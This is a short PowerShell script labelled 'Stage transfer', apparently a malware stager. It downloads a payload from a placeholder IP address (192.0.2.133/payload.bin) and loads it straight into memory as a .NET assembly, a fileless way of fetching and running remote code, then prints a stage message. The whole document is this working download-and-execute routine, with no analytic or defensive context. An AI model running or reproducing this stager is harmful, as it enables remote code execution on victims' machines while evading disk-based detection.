<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://192.0.2.133/payload.bin'
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($PayloadUrl)
[Reflection.Assembly]::Load($ManagedBytes)
Write-Output "stage 31 initialized"
